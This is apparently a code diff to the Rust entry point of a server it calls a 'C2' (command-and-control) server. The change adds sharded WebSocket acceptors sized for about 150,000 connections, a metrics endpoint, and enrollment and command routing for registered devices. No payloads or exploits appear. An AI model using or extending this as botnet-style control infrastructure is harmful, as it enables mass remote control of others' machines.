@@ -18,6 +18,7 @@ mod device_registry;
 mod command_queue;
 mod session;
 mod metrics;
+mod scale_handler;
 
 use device_registry::DeviceRegistry;
 use command_queue::CommandQueue;
@@ -338,37 +339,51 @@ async fn main() -> Result<()> {
     let pool = SqlitePool::connect(db_url).await?;
     sqlx::migrate!("./migrations").run(&pool).await?;
 
-    // Create C2 server
+    // Scale configuration from environment
+    let num_shards = std::env::var("C2_SHARDS")
+        .ok()
+        .and_then(|v| v.parse::<u8>().ok())
+        .unwrap_or_else(|| num_cpus::get() as u8);
+    let max_connections = std::env::var("C2_MAX_CONNECTIONS")
+        .ok()
+        .and_then(|v| v.parse::<usize>().ok())
+        .unwrap_or(150_000); // 100K target + 50K headroom
+    let bind_addr = std::env::var("C2_BIND_ADDR")
+        .unwrap_or_else(|_| "0.0.0.0:8080".to_string());
+
+    // Create sharded connection manager — one Tokio runtime per shard
+    let shard_manager = scale_handler::ShardManager::new(num_shards, pool.clone());
+    info!("ShardManager initialized: {} shards, max {} connections", num_shards, max_connections);
+
+    // Also create legacy C2 server for DB/registry operations
+    // (scale_handler handles raw WS, C2Server handles enrollment + command routing)
     let server = Arc::new(C2Server::new(db_url).await?);
 
-    // Start WebSocket server on 0.0.0.0:8080
-    let listener = TcpListener::bind("0.0.0.0:8080").await?;
-    info!("C2 WebSocket server listening on 0.0.0.0:8080");
+    // Prometheus metrics on :9090
+    let scale_metrics = Arc::new(scale_handler::ScaleMetrics::new());
+    let sm_clone = scale_metrics.clone();
+    let shard_manager_clone = shard_manager.clone();
+    tokio::spawn(async move {
+        let mut ticker = tokio::time::interval(std::time::Duration::from_secs(5));
+        loop {
+            ticker.tick().await;
+            sm_clone.record_connection(shard_manager_clone.connected_count() as u64);
+        }
+    });
 
-    let server_metrics = server.clone();
-    let metrics_handle = tokio::spawn(async move {
-        let listener = TcpListener::bind("0.0.0.0:9090").await.unwrap();
+    let scale_metrics_warp = scale_metrics.clone();
+    tokio::spawn(async move {
         info!("Metrics endpoint on 0.0.0.0:9090/metrics");
-        
         let metrics_filter = warp::path!("metrics")
-            .map(move || {
-                server_metrics.metrics.export_prometheus()
-            });
-
+            .map(move || scale_metrics_warp.export_prometheus());
         warp::serve(metrics_filter)
             .bind_with_graceful_shutdown(([0, 0, 0, 0], 9090), async {})
             .await;
     });
 
-    // Accept connections
-    loop {
-        let (stream, addr) = listener.accept().await?;
-        let server = server.clone();
+    // Launch sharded acceptors — SO_REUSEPORT for OS-level load balancing
+    info!("Starting {} acceptors on {}", num_shards, bind_addr);
+    scale_handler::run_acceptors(&bind_addr, shard_manager, max_connections).await?;
 
-        tokio::spawn(async move {
-            if let Err(e) = server.handle_connection(stream, addr).await {
-                error!("Connection handler error: {}", e);
-            }
-        });
-    }
+    Ok(())
 }
